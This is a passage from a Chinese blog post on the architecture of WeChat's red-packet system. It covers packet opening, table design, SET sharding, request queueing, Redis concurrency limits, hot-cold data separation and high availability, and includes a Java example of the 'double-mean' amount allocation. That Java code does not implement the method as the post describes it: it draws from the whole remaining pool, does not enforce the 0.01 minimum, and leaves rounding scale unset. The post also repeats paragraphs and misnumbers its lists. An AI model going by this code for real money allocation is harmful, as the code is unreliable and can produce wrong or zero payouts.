title="功能4：拆红包"></a>功能4：拆红包</h3><p>拆红包是整个发红包流程最复杂的一个操作，需要查询这个红包的红包订单，判断用户是否可以拆包，计算本次可拆到的红包金额，并记录抢红包流水。</p><p>拆红包包括如下步骤：</p><ul><li><p>1）查询这个红包发送订单，判断用户是否可拆，然后计算本次可拆到的红包金额；</p></li><li><p>2）然后写入一条抢红包记录。如果把拆红包过程，类比为一个秒杀活动的过程，相当于扣库存与写入秒杀记录的过程；</p></li><li><p>3）更新库存对应于更新红包发送订单，写入秒杀记录对应于写入这个红包的领取红包记录；</p></li><li><p>4）另外，还要写入用户整体的红包领取记录；</p></li><li><p>5）最后请求微信支付系统给拆到红包用户转入零钱，成功后更新抢红包的订单状态为已转账成功。</p></li></ul><p><img src="/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/5.png"></p><p>拆红包过程类似于一个秒杀活动的过程，需要做好库存扣减和秒杀记录的操作。</p><p>更新库存就是更新红包发送的订单，写入秒杀记录就是写入红包领取的信息流水。</p><p>还需要以用户为中心记录用户整体的红包领取记录。</p><p>最后调用支付系统将拆红包后的金额转入用户零钱中，成功之后更新抢红包的订单状态为转账成功。</p><blockquote><p>所以，在看此文之前，最好看看的高并发三部曲的Java高并发核心编程卷3*（注意是最新的清华大学出版社出版的加强版），里边有秒杀架构，可以作为知识铺垫。</p></blockquote><h4 id="微信红包的业务特点-1"><a href="#微信红包的业务特点-1" class="headerlink" title="微信红包的业务特点"></a>微信红包的业务特点</h4><p>微信红包，特别是群红包，业务形态上类似于普通商品的”秒杀”活动。</p><ul><li><p>包红包类似秒杀商品管理</p></li><li><p>发红包类似“秒杀”活动的商品上架；</p></li><li><p>抢红包等同于“秒杀”活动中的查询库存；</p></li><li><p>拆红包对应“秒杀”活动中用户的“秒杀”动作。</p><p>微信红包在业务形态上和普通商品”秒杀”活动相比，还有自身特点：</p></li></ul><ol><li><p><strong>海量并发请求</strong>：微信红包用户在微信群发一个红包，等同于在网上发布一次商品”秒杀”活动，假设同时有10万个群的用户同时发红包，那就相当于同一时间有10万个”秒杀”活动发布。10万个微信群的用户同时抢红包，将产生海量并发请求。</p></li><li><p><strong>更严格的安全级别</strong>：微信红包业务本质上是资金交易，微信红包是微信支付的一个商户，提供资金流转服务，用户发红包相当于在微信红包这个商户上使用微信支付购买了一笔”钱”，且收货地址是微信群。当用户支付成功后，红包”发货”到微信群里，群里的用户拆开红包后，微信红包提供了将”钱”转入拆红包用户微信零钱的服务。</p></li><li><p><strong>订单层南北独立体系</strong>：微信红包系统采用南北独立体系的订单层设计，即数据在南北两个系统中不同步。用户就近接入系统，请求发红包时，系统会根据用户所在地分配订单到南或北的系统，并在订单号上打上南北标识。这种设计有助于分摊流量，降低系统风险。</p></li><li><p><strong>流量闭环</strong>：在抢红包、拆红包、查红包详情列表时，接入层会根据红包单号上的南北标识，将流量分别引导到对应的南北系统闭环。这意味着，无论是发红包还是抢红包，用户都能够在就近的系统中完成操作，无需跨城，提高了系统的响应速度和稳定性。</p></li><li><p><strong>用户数据处理</strong>：微信红包系统的用户数据采取写多读少、全量保存的策略。用户数据的查询入口在微信钱包中，相对隐藏，访问量不会太大，且被视为可旁路的非关键信息，实时性要求不高。这种设计方式可以减少数据存储的压力，提高系统性能。</p></li><li><p><strong>实时计算红包金额</strong>：</p><p>微信红包的金额是在拆红包时实时计算的，而不是预先分配的。系统会在拆红包时取0.01到剩余平均值*2之间的数值作为红包金额。</p><p>这种实时计算的方式基于内存进行，不需要额外的存储空间，且计算效率很高。</p><p>同时，为了保证操作的原子性，拆包过程中使用了CAS（Compare-and-Swap）算法，确保每次只有一个并发用户拆包成功。如果拆包CAS失败，系统会自动进行重试，但也可能在重试过程中被其他用户抢得先机而空手而归。</p></li><li><p><strong>架构演进</strong>：随着微信红包功能的不断发展和用户量的增长，其系统架构也经历了不断的演进和优化。从最初的数据库硬抗整个流量，到后来的使用缓存（cache）抗流量，再到现在的南北独立体系等设计，都是为了更好地应对高并发、提升系统性能和稳定性。</p><p>资金交易业务比普通商品”秒杀”有更高的安全级别要求，普通的商品”秒杀”由商户提供，库存是商户预设，”秒杀”允许存在超卖和少卖的情况，但对于微信红包，用户发100元的红包绝对不可以拆出101元，以及只被领取99元时，剩下的1元在24小时过期后要精准退还给发红包用户。</p><p>总的来说，微信红包系统架构的设计充分考虑了用户量、并发量、性能要求等因素，通过南北独立体系、流量闭环、用户数据处理、实时计算红包金额以及架构演进等多种手段，保证了系统的稳定运行和良好用户体验。</p></li></ol><h4 id="微信红包的技术难点-1"><a href="#微信红包的技术难点-1" class="headerlink" title="微信红包的技术难点"></a>微信红包的技术难点</h4><p>微信红包系统架构的技术难点主要体现在以下几个方面：</p><ol><li><p><strong>高并发难点</strong>：</p><p>微信红包在特定时间（如春节、节假日等）会面临极高的并发量，如何有效地处理这些并发请求，保证系统的稳定性和响应速度，是红包系统架构设计的关键挑战之一。</p></li><li><p><strong>资金安全难点</strong>：</p><p>红包系统涉及到资金的转移和存储，因此资金安全是系统设计的重中之重。如何确保资金安全，防止被攻击或篡改，是系统架构设计中需要重点考虑的问题。</p><p>红包业务涉及资金交易，所以一定不能出现超卖、少卖的情况。</p></li></ol><ul><li><p>超卖：发了 10 块钱，结果抢到了 11 块钱，多的钱只能系统补上，如此为爱发电应用估计早就下架了；</p></li><li><p>少卖：发了 10 块钱，只抢了 9 块，多的钱得原封不动地退还用户，否则第二天就接到法院传单了。</p></li></ul><ol start="4"><li><p><strong>用户体验难点</strong></p><p>红包系统需要保证良好的用户体验，包括响应速度、公平性（先抢先得）、成功率等。</p><p>如何在高并发场景下保证用户体验，是系统架构设计的重要目标。</p><p>了解下微信红包的用户体验 的4大核心：摇&#x2F;发&#x2F;抢&#x2F;拆。</p></li></ol><ul><li><p>摇：摇的流畅</p></li><li><p>快：抢的要快</p></li><li><p>爽：拆的爽</p></li><li><p>稳：能分享出去</p></li></ul><ol start="6"><li><p><strong>数据一致性难点</strong>：</p><p>红包系统需要保证数据的一致性，包括红包库存数据、用户账户数据等。如何在高并发场景下保证数据的一致性，是系统架构设计的重要挑战。</p></li></ol><ul><li><p>参与用户越多，并发 DB 请求越大，数据越容易出现事务问题，所以系统得做好<strong>事务一致性</strong>；</p></li><li><p>抢红包系统涉及金钱交易，所以事务级别要求更高，<strong>不能出现脏数据</strong>。</p></li></ul><ol start="8"><li><p><strong>系统扩展性难点</strong>：</p><p>随着用户量和业务量的增长，红包系统需要具备良好的扩展性，能够方便地增加新的功能或提升性能。</p><p>如何设计可扩展的系统架构，是系统架构设计的重要考虑因素。</p><p>为了解决这些技术难点，我们可以采用多种技术手段，如分而治之、负载均衡、读写分离、水平切分、垂直切分等，来提升系统的性能和稳定性。同时，系统还采用了柔性服务、系统降级等策略，来保证在有限资源下满足用户的核心需求。</p></li></ol><h3 id="红包系统概要设计"><a href="#红包系统概要设计" class="headerlink" title="红包系统概要设计"></a>红包系统概要设计</h3><h4 id="系统功能说明-1"><a href="#系统功能说明-1" class="headerlink" title="系统功能说明"></a>系统功能说明</h4><p>抢红包功能允许用户在群聊中发送任意个数和金额的红包，群成员可以抢到随机金额的红包，但要<strong>保证每个用户的红包金额不小于 0.01 元</strong>。</p><p><img src="/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/3.png"><br>抢红包的详细交互流程如下：</p><ol><li><p>用户接收到抢红包通知，点击通知打开群聊页面；</p></li><li><p>用户点击抢红包，后台服务验证用户资格，确保用户尚未领取过此红包；</p></li><li><p>若用户资格验证通过，后台服务分配红包金额并存储领取记录；</p></li><li><p>用户在微信群中看到领取金额，红包状态更新为“已领取”；</p></li><li><p>异步调用支付接口，将红包金额更新到钱包里。</p></li></ol><h2 id="数据库设计"><a href="#数据库设计" class="headerlink" title="数据库设计"></a>数据库设计</h2><p><strong>红包表：redpack</strong></p><p>红包表用来记录用户发了多少红包，以及需要维护的剩余金额，</p><p>红包表：redpack的字段如下：</p><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td>id</td><td>主键，红包ID。</td></tr><tr><td>user_id</td><td>发送红包的用户id。</td></tr><tr><td>total_amount</td><td>红包总金额。</td></tr><tr><td>surplus_amount</td><td>红包剩余金额。</td></tr><tr><td>total</td><td>红包总数。</td></tr><tr><td>surplus_total</td><td>剩余红包总数。</td></tr></tbody></table><p><strong>红包记录表：redpack_record</strong></p><table><thead><tr><th>字段</th><th>描述</th></tr></thead><tbody><tr><td>id</td><td>主键，记录id。</td></tr><tr><td>redpack_id</td><td>红包id。</td></tr><tr><td>user_id</td><td>用户id。</td></tr><tr><td>amount</td><td>抢到的金额。</td></tr></tbody></table><h4 id="发红包-1"><a href="#发红包-1" class="headerlink" title="发红包"></a>发红包</h4><p>设置完红包参数后，微信支付，完成付款，然后收到付款成功通知，红包系统更新红包订单状态，更新为已支付，并写入红包发送记录表。</p><p>这样用户可以将用户的红包信息和红包的收发记录发出，红包系统调用微信通知，将红包信息发送到微信群。</p><p>发红包的交互步骤如下：</p><ol><li><p>用户设置红包的总金额和个数后，在红包表中增加一条数据，开始发红包；</p></li><li><p>为了保证实时性和抢红包的效率，在 Redis 中增加一条记录，<strong>存储红包 ID 和总人数 n</strong>；</p></li><li><p>抢红包消息推送给所有群成员。</p></li></ol><h4 id="抢红包-1"><a href="#抢红包-1" class="headerlink" title="抢红包"></a>抢红包</h4><p>微信群用户收到红包后，点开，红包系统会校验红包是否被抢完，是否过期。</p><p>微信红包的抢红包和拆红包是两个分离的服务，用户点击抢红包后需要进行两次操作。</p><p>这也是为什么明明有时候抢到了红包，点开后却发现<strong>该红包已经被领取完了</strong>。</p><p>抢红包的交互步骤如下：</p><ol><li><p>抢红包：抢操作在 Redis 缓存层完成，通过原子递减的操作来更新红包个数，个数递减为 0 后就说明抢光了。</p></li><li><p>拆红包：拆红包时，首先会实时计算金额，一般是通过二倍均值法实现（即 0.01 到剩余平均值的 2 倍之间）。</p></li><li><p>红包记录：用户获取红包金额后，通过数据库的事务操作累加已经领取的个数和金额，并更新红包表和记录表。</p></li><li><p>转账：为了提升效率，最终的转账为异步操作，这也是为什么在春节期间，红包领取后不能立即在余额中看到的原因。</p></li></ol><h2 id="红包系统详细设计"><a href="#红包系统详细设计" class="headerlink" title="红包系统详细设计"></a>红包系统详细设计</h2><h3 id="红包整体架构"><a href="#红包整体架构" class="headerlink" title="红包整体架构"></a>红包整体架构</h3><p>如下图所示，是微信红包的系统架构</p><p><img src="/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/4.png"><br>总体是三层架构：</p><ul><li><p>首先是微信统一接入层，下面是微信红包系统 API，包括发、抢、拆、查红包详情、查红包用户列表。</p></li><li><p>接入层下面，是封装微信红包关键业务的逻辑服务；</p></li><li><p>业务下面数据存储层，微信红包最主要的数据是订单数据，包括发红包订单和拆红包订单两部分。</p></li></ul><p>数据存储层的冷热分离设计：微信红包数据的访问热度，随着时间流逝会急剧降低，也就是数据的访问时间段非常集中，一般红包发出三天后，99% 的用户不会再去点开这个红包了。因此微信红包系统采取按时间做冷热数据分离，降低数据的存储成本，同时提升了热数据的访问性能。</p><p>除了在线计算的三层架构，还有离线处理的数据分析。</p><p>数据分析平台用于对红包数据的分析计算，比如朋友圈里的文章，统计从 某年 1 月 1 日到 2017 年 1 月一个用户总共抢红包的金额，在全国的排名情况，发红包数最多的城市等。</p><p>数据分析平台另外一个作用就是对账，红包的订单和微信支付的订单需要对账，以保证最终资金的一致性；</p><ul><li><p>订单的数据和订单的 cache 需要做对账，以保证数据的完整性；</p></li><li><p>订单数据和用户的收发记录需要对账，以保证用户列表完整性。</p></li></ul><h3 id="高并发常用解决方案"><a href="#高并发常用解决方案" class="headerlink" title="高并发常用解决方案"></a>高并发常用解决方案</h3><p>普通商品秒杀系统，解决高并发问题的方案，大致有以下2种：</p><h3 id="1-使用内存替代实时的DB"><a href="#1-使用内存替代实时的DB" class="headerlink" title="1- 使用内存替代实时的DB"></a>1- 使用内存替代实时的DB</h3><p>将实时扣库存的行为上移到内存Cache中，内存Cache操作成功直接给Server返回成功，然后异步落DB持久化。</p><p><img src="/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/8.png"><br>这个方案的优缺点如下：</p><blockquote><p>优点：用内存操作替代磁盘操作，提高了并发性能。</p><p>缺点：在内存操作成功DB持久化失败，或者内存Cache故障的情况下，DB持久化会丢数据，不适合微信红包这种资金交易系统。</p></blockquote><h3 id="2-使用乐观锁替代悲观锁"><a href="#2-使用乐观锁替代悲观锁" class="headerlink" title="2- 使用乐观锁替代悲观锁"></a>2- 使用乐观锁替代悲观锁</h3><p><strong>什么是悲观锁呢？</strong></p><p>所谓悲观锁，是关系数据库管理系统里的一种并发控制的方法。它可以阻止一个事务以影响其他用户的方式来修改数据。如果一个事务执行的操作对某行数据应用了锁，那只有当这个事务把锁释放，其他事务才能够执行与该锁冲突的操作。对应于上文分析中的“并发请求抢锁”行为。</p><p><strong>什么是乐观锁呢？</strong></p><p>所谓乐观锁，它假设多用户并发的事务在处理时不会彼此互相影响，各事务能够在不产生锁的情况下处理各自影响的那部分数据。在提交数据更新之前，每个事务会先检查在该事务读取数据后，有没有其他事务又修改了该数据。如果其他事务有更新的话，正在提交的事务会进行回滚。</p><p>乐观锁分为DB乐观锁和 JVM CAS 乐观锁。</p><p>DB乐观锁的具体应用方法，是在 DB 的“库存”记录中维护一个版本号。</p><p>商品“秒杀”系统中，在更新“库存”的操作进行前，先去 DB 获取当前版本号。</p><p>在更新库存的事务提交时，检查该版本号是否已被其他事务修改。如果版本没被修改，则提交事务，且版本号加 1；如果版本号已经被其他事务修改，则回滚事务，并给上层报错。</p><p>DB乐观锁可以提高DB的并发处理能力，但是如果应用于微信红包系统，则会存在下面三个问题：</p><ol><li><p>如果拆红包采用乐观锁，那么在并发抢到相同版本号的拆红包请求中，只有一个能拆红包成功，其他的请求将事务回滚并返回失败，给用户报错，用户体验完全不可接受。</p></li><li><p>如果采用乐观锁，将会导致第一时间同时拆红包的用户有一部分直接返回失败，反而那些“手慢”的用户，有可能因为并发减小后拆红包成功，这会带来用户体验上的负面影响。</p></li><li><p>如果采用乐观锁的方式，会带来大数量的无效更新请求、事务回滚，给 DB 造成不必要的额外压力。</p></li></ol><h4 id="JVM-CAS-乐观锁方案-1"><a href="#JVM-CAS-乐观锁方案-1" class="headerlink" title="JVM CAS 乐观锁方案"></a>JVM CAS 乐观锁方案</h4><p>出于性能原因，微信红包系统使用 JVM CAS 乐观锁，而不是DB乐观锁的方式解决并发抢锁问题。</p><p>微信红包的金额是在拆红包时实时计算的，而不是预先分配的。系统会在拆红包时取0.01到剩余平均值*2之间的数值作为红包金额。</p><p>这种实时计算的方式基于JVM 内存进行，不需要额外的存储空间，且计算效率很高。</p><p>同时，为了保证操作的原子性，拆包过程中使用了CAS（Compare-and-Swap）算法，确保每次只有一个并发用户拆包成功。如果拆包CAS失败，系统会自动进行重试，但也可能在重试过程中被其他用户抢得先机而空手而归。</p><p>如何保证同一个红包由同一个节点去拆包呢？将同一个红包 ID 的所有请求 stick 到同一台 Server，这个后面介绍。</p><blockquote><p>以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p></blockquote><h2 id="微信红包系统的高并发解决方案"><a href="#微信红包系统的高并发解决方案" class="headerlink" title="微信红包系统的高并发解决方案"></a>微信红包系统的高并发解决方案</h2><p>综合上面的分析，我们的红包系统针对相应的技术难点，采用如下3个方案，解决高并发问题。</p><h5 id="1-分而治之：系统架构设计垂直Set化。-1"><a href="#1-分而治之：系统架构设计垂直Set化。-1" class="headerlink" title="1- 分而治之：系统架构设计垂直Set化。"></a>1- 分而治之：系统架构设计垂直Set化。</h5><p><strong>什么是Set（单元）化架构呢?</strong></p><blockquote><p>单元化架构是一种将系统划分为多个独立的、自包含的单元的部署架构，每个单元都能够完成所有业务操作，包含所有业务所需的服务以及分配给该单元的数据。这种架构将单元作为部署的基本单位，在全站所有机房中部署多个单元，每个机房内的单元数目不固定，但任一单元均部署系统所需的全部应用。数据则是全量数据按照某种维度划分后的一部分。与传统意义上的SOA（服务化）架构不同，单元化架构下，服务仍然是分层的，但每一层中的任意一个节点都属于且仅属于某一个单元，上层调用下层时，仅会选择本单元内的节点。</p></blockquote><p><strong>通俗的理解为</strong>：</p><p>单元化架构，简单来说，就是把系统拆分成若干个独立的单元，每个单元都包含了完成业务操作所需的所有服务和数据。这些单元可以独立部署、管理和监控，就像一个个小房子，每个房子都有自己的客厅、卧室和厨房（服务），也有自己的食物和水（数据）。</p><p>如下图，是一种单元化架构设计。</p><p><img src="/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/6.png"></p><p>微信红包用户发一个红包时，微信红包系统生成一个 ID 作为这个红包的唯一标识。</p><p>接下来这个红包的所有发红包、抢红包、拆红包、查询红包详情等操作，都根据这个 ID 关联。</p><p>红包系统根据这个红包 ID，按一定的规则（如按 ID 尾号取模等），垂直上下切分。</p><p>切分后，一个垂直链条上的逻辑 Server 服务器、DB 统称为一个 SET。</p><p>各个 SET 之间相互独立，互相解耦。并且同一个红包 ID 的所有请求，包括发红包、抢红包、拆红包、查详情详情等，垂直 stick 到同一个 SET 内处理，高度内聚。</p><p>通过这样的方式，系统将所有红包请求这个巨大的洪流分散为多股小流，互不影响，分而治之，如下图所示。</p><p><img src="/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/7.png"><br>这个方案解决了同时存在海量事务级操作的问题，将<strong>海量化为小量</strong>。</p><h5 id="2-解决DB并发：逻辑Server层将请求排队。-1"><a href="#2-解决DB并发：逻辑Server层将请求排队。-1" class="headerlink" title="2- 解决DB并发：逻辑Server层将请求排队。"></a>2- 解决DB并发：逻辑Server层将请求排队。</h5><p>红包系统是资金交易系统，DB 操作的事务性无法避免，所以会存在“并发抢锁”问题。但是如果到达 DB 的事务操作（也即拆红包行为）不是并发的，而是串行的，就不会存在“并发抢锁”的问题了。</p><p>按这个思路，为了使拆红包的事务操作串行地进入 DB，只需要将请求在 Server 层以 FIFO（先进先出）的方式排队，就可以达到这个效果。从而问题就集中到 Server 的 FIFO 队列设计上。</p><p>红包系统设计了分布式的、轻巧的、灵活的 FIFO 队列方案。其具体实现如下：</p><p><strong>1）将同一个红包 ID 的所有请求 stick 到同一台 Server。</strong></p><p>上面 SET 化方案已经介绍，同个红包 ID 的所有请求，按红包 ID stick 到同个 SET 中。</p><p>不过在同个 SET 中，会存在多台 Server 服务器同时连接同一台 DB（基于容灾、性能考虑，需要多台 Server 互备、均衡压力）。</p><p>为了使同一个红包 ID 的所有请求，stick 到同一台 Server 服务器上，在 SET 化的设计之外，微信红包系统添加了一层基于红包 ID hash 值的分流，如下图所示。</p><blockquote><p>以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p></blockquote><p><strong>2）设计单机请求排队方案。</strong></p><p>将 stick 到同一台 Server 上的所有请求在被接收进程接收后，按红包 ID 进行排队。</p><p>然后串行地进入 worker 进程（执行业务逻辑）进行处理，从而达到排队的效果，如下图所示。</p><p><img src="/./2024/05/28/%E7%99%BE%E4%BA%BF%E6%B5%81%E9%87%8F%E7%BA%A2%E5%8C%85%E7%B3%BB%E7%BB%9F/9.png"><br><strong>3）增加 Redis缓存 控制并发。</strong></p><p>为了防止 Server 中的请求队列过载导致队列被降级，从而所有请求拥进 DB，系统增加了与 Server 服务器同机部署的 Redis ，用于控制拆同一个红包的请求并发数。</p><p>具体来说，利用 Redis 的 CAS 原子累增操作，控制同时进入 DB 执行拆红包事务的请求数，超过预先设定数值则直接拒绝服务。用于 DB 负载升高时的降级体验。</p><p>通过以上三个措施，系统有效地控制了 DB 的“并发抢锁”情况。</p><h5 id="3-系统性能稳定性保障：双维度分库分表设计。-1"><a href="#3-系统性能稳定性保障：双维度分库分表设计。-1" class="headerlink" title="3- 系统性能稳定性保障：双维度分库分表设计。"></a>3- 系统性能稳定性保障：双维度分库分表设计。</h5><p>红包系统的分库表规则，初期是根据红包 ID 的 hash 值分为多库多表。</p><p>随着红包数据量逐渐增大，单表数据量也逐渐增加。而 DB 的性能与单表数据量有一定相关性。当单表数据量达到一定程度时，DB 性能会有大幅度下降，影响系统性能稳定性。</p><p>采用冷热分离，将历史冷数据与当前热数据分开存储，可以解决这个问题。</p><p>处理微信红包数据的冷热分离时，系统在以红包 ID 维度分库表的基础上，增加了以循环天分表的维度，形成了双维度分库表的特色。</p><p>具体来说，就是分库表规则像 db_xx.t_y_dd 设计，其中，xx&#x2F;y 是红包 ID 的 hash 值后三位，dd 的取值范围在 01~31，代表一个月天数最多 31 天。</p><p>通过这种双维度分库表方式，解决了 DB 单表数据量膨胀导致性能下降的问题，保障了系统性能的稳定性。同时，在热冷分离的问题上，又使得数据搬迁变得简单而优雅。</p><p>综上所述，微信红包系统在解决高并发问题上的设计，主要采用了 <strong>SET 化分治</strong>、<strong>请求排队</strong>、<strong>双维度分库表</strong>等方案，使得单组 DB 的并发性能大幅度提升，取得了很好的效果。</p><h4 id="红包分配算法-1"><a href="#红包分配算法-1" class="headerlink" title="红包分配算法"></a>红包分配算法</h4><p>抢红包后，我们需要进行拆红包，接下来我们讨论一下红包系统的红包分配算法。</p><p>红包金额分配时，由于是随机分配，所以有两种实现方案：<strong>实时拆分和预先生成</strong></p><h5 id="1-实时拆分-1"><a href="#1-实时拆分-1" class="headerlink" title="1- 实时拆分"></a>1- 实时拆分</h5><p>实时拆分，指的是在<strong>抢红包时实时计算</strong>每个红包的金额，以实现红包的拆分过程。</p><p>这个对系统性能和拆分算法要求较高，例如拆分过程要一直保证后续待拆分红包的金额不能为空，不容易做到拆分的红包金额服从<strong>正态分布</strong>规律。</p><h5 id="2-预先生成-1"><a href="#2-预先生成-1" class="headerlink" title="2- 预先生成"></a>2- 预先生成</h5><p>预先生成，指的是在红包<strong>开抢之前</strong>已经完成了红包的<strong>金额拆分</strong>，抢红包时只是依次取出拆分好的红包金额。</p><p>这种方式对拆分算法要求较低，可以拆分出随机性很好的红包金额，但通常需要结合队列使用。</p><h5 id="3-二倍均值法-1"><a href="#3-二倍均值法-1" class="headerlink" title="3- 二倍均值法"></a>3- 二倍均值法</h5><p>综合上述优缺点考虑，以及微信群聊中的人数不多（目前最高 500 人），所以我们采用实时拆分的方式，用<strong>二倍均值法</strong>来生成随机红包，只满足随机即可，不需要正态分布。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">使用二倍均值法生成的随机数，每次随机金额会在  0.01 ~ 剩余平均值\*2 之间。  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>假设当前红包剩余金额为 10 元，剩余个数为 5，<strong>10&#x2F;5 &#x3D; 2</strong>，则当前用户可以抢到的红包金额为：<strong>0.01 ~ 4</strong> 元之间。</p><p>以下是使用Java实现的二倍均值算法，在红包分配场景中。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">public class RedPacketDistribution &#123;  </span><br><span class="line">  </span><br><span class="line">    public static List&lt;BigDecimal&gt; distribute(BigDecimal totalAmount, int totalCount) &#123;  </span><br><span class="line">        // 校验总金额是否为正  </span><br><span class="line">        if (totalAmount.compareTo(BigDecimal.ZERO) &lt;= 0) &#123;  </span><br><span class="line">            throw new IllegalArgumentException(&quot;Invalid parameter, totalAmount must be positive.&quot;);  </span><br><span class="line">        &#125;  </span><br><span class="line">        // 校验红包总数是否至少为1  </span><br><span class="line">        if (totalCount &lt; 1) &#123;  </span><br><span class="line">            throw new IllegalArgumentException(&quot;Invalid parameter, totalCount must be at least 1.&quot;);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        List&lt;BigDecimal&gt; redPacketList = new ArrayList&lt;&gt;(totalCount);  </span><br><span class="line">        BigDecimal remainingAmount = totalAmount.multiply(BigDecimal.valueOf(2)); // 初始化为总金额的两倍  </span><br><span class="line">        ThreadLocalRandom random = ThreadLocalRandom.current(); // 使用线程安全的随机数生成器  </span><br><span class="line">  </span><br><span class="line">        for (int i = 0; i &lt; totalCount - 1; i++) &#123;  </span><br><span class="line">            // 随机获取一个幸运值，范围在\[0, 当前剩余金额)  </span><br><span class="line">            BigDecimal luckValue = BigDecimal.valueOf(random.nextDouble()).multiply(remainingAmount);  </span><br><span class="line">            // 计算并添加实际分配的红包金额（幸运值的一半）  </span><br><span class="line">            BigDecimal amount = luckValue.divide(BigDecimal.valueOf(2), BigDecimal.ROUND\_HALF\_DOWN);  </span><br><span class="line">            redPacketList.add(amount);  </span><br><span class="line">            // 更新剩余金额  </span><br><span class="line">            remainingAmount = remainingAmount.subtract(luckValue);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        // 最后一个红包直接拿走剩余的全部金额，确保总和正确  </span><br><span class="line">        redPacketList.add(remainingAmount.divide(BigDecimal.valueOf(2), BigDecimal.ROUND\_HALF\_DOWN));  </span><br><span class="line">  </span><br><span class="line">        return redPacketList;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    public static void main(String\[\] args) &#123;  </span><br><span class="line">        BigDecimal totalAmount = new BigDecimal(&quot;100.00&quot;); // 红包总金额  </span><br><span class="line">        int totalCount = 10;      // 红包个数  </span><br><span class="line">        List&lt;BigDecimal&gt; redPackets = distribute(totalAmount, totalCount);  </span><br><span class="line">  </span><br><span class="line">        System.out.println(&quot;Red packet distribution:&quot;);  </span><br><span class="line">        for (BigDecimal amount : redPackets) &#123;  </span><br><span class="line">            System.out.printf(&quot;%.2f, &quot;, amount);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>以上内容比较复杂，架构团队会录制成为架构视频， 帮助大家做架构拿高薪。</p></blockquote><h2 id="红包系统高可用架构设计"><a href="#红包系统高可用架构设计" class="headerlink" title="红包系统高可用架构设计"></a>红包系统高可用架构设计</h2><p>红包业务量级的高速发展，对后台系统架构的可用性要求越来越高。在保障微信红包业务体验的前提下，红包后台系统进行了一系列高可用方面的优化设计。</p><p>要保障红包系统架构的高可用性，可以从多个方面进行优化和设计。以下是一些详细说明：</p><ol><li><strong>系统架构设计</strong>：</li></ol><ul><li><p><strong>信息流、业务流、资金流分离</strong>：红包系统由信息流、业务流、资金流三部分组成，这三部分在组织架构上应由不同的后台团队完成，以提高系统的模块化和可维护性。</p></li><li><p><strong>微服务架构</strong>：采用微服务架构，将红包系统拆分成多个独立的服务，每个服务负责特定的功能，这样可以提高系统的可扩展性和容错性。</p></li><li><p><strong>无状态设计</strong>：确保红包系统的服务是无状态的，即服务不需要保存用户的会话信息，这样可以提高系统的并发处理能力和可靠性。</p></li></ul><ol start="3"><li><strong>高可用性策略</strong>：</li></ol><ul><li><p><strong>冗余部署</strong>：将系统的关键组件部署在多台服务器上，通过搭建主备或者集群的架构来实现冗余。当主服务器出现故障时，备用服务器能够自动接管，保证系统的可用性。</p></li><li><p><strong>负载均衡</strong>：通过将流量分发到多台服务器上，均衡系统的请求负载，提高系统的可用性和扩展性。负载均衡可以通过硬件（如负载均衡器）或者软件（如Nginx、HAProxy）实现。</p></li><li><p><strong>服务容器化</strong>：使用容器技术（如Docker、Kubernetes）将应用程序与其依赖项打包为容器，实现快速部署、弹性扩展和自动化管理。容器化可以提高系统的可移植性、弹性和可伸缩性，从而增加系统的高可用性。</p></li></ul><ol start="5"><li><strong>数据保障</strong>：</li></ol><ul><li><p><strong>数据备份与恢复</strong>：定期对关键数据进行备份，并确保备份的数据可用性。这样，在发生数据丢失或损坏时，可以快速恢复数据，减少系统停机时间。</p></li><li><p><strong>分布式缓存</strong>：使用多级缓存技术（如Redis、Memcached等），将数据分别存储在内存缓存、本地缓存和分布式缓存中，以提高访问速度和降低数据库压力。</p></li><li><p><strong>数据一致性</strong>：使用分布式锁技术来保护红包的领取操作，确保每个用户只能领取一次红包。同时，为了保证数据一致性，可以采用消息队列等技术实现请求的异步处理和结果的返回。</p></li></ul><ol start="7"><li><strong>监控与告警</strong>：</li></ol><ul><li><p><strong>系统监控</strong>：对红包系统的关键指标（如请求量、响应时间、错误率等）进行实时监控，以便及时发现和解决潜在问题。</p></li><li><p><strong>告警机制</strong>：设置合理的告警阈值，当系统出现异常情况时，及时发送告警通知给相关人员，以便快速响应和处理。</p></li></ul><ol start="9"><li><p><strong>安全性保障</strong>：</p><p>通过以上措施的综合应用，可以大大提高红包系统架构的高可用性，确保系统在高峰时段能够稳定、高效地运行。</p></li></ol><ul><li><p><strong>访问控制</strong>：实施严格的访问控制策略，确保只有授权的用户才能访问红包系统。</p></li><li><p><strong>数据加密</strong>：对敏感数据进行加密存储和传输，以防止数据泄露和篡改。</p></li><li><p><strong>安全审计</strong>：定期对红包系统进行安全审计和漏洞扫描，及时修复发现的安全漏洞和隐患。</p></li></ul><h4 id="1-系统可用性影响因素-1"><a href="#1-系统可用性影响因素-1" class="headerlink" title="1 - 系统可用性影响因素"></a>1 - 